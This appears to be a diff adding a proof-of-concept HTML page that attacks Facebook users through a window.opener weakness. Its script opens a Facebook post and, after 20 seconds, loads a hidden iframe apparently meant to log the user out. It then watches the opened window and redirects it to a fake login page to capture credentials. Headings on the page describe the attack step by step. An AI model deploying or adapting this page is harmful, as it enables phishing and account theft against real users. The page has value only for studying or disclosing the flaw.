@@ -1,0 +1,30 @@
+<html>
+
+<head></head>
+
+<body style=" font-size: 24px; padding-top: 100px; background: #233551; color:white; font-family: arial">
+    <center>
+        <h3>Click everywhere to trigger window.opener vulnerability </h3>
+        <h3>But you have to be alread logged into facebook</h3>
+        <h3>After 20 seconds of reading Mark's post </h3>
+        <h3>You will be logged out </h3>
+        <h3>and when you do any action on the page </h3>
+        <h3>you will be redirected to fake login page </h3>
+        <script>
+        document.onclick = function() {
+            _window = window.open("https://www.facebook.com/zuck/posts/10104146268321841");
+            setTimeout(function() {
+                var iframe = document.createElement("iframe");
+                iframe.style.cssText = "display: none";
+                iframe.src = "https://www.facebook.com/n/?mid=55aaaaaaaaaaaG5af3eb345863G55aaaaaaaaaaaG32b";
+                document.body.appendChild(iframe);
+                var lastLength = _window.length;
+                setInterval(function() { if (_window.length != lastLength) { lastLength = _window.length;
+                        _window.location = "FakeLoginPage.html";
+                }}, 300);
+            }, 20000);
+        }
+        </script>
+</body>
+
+</html>
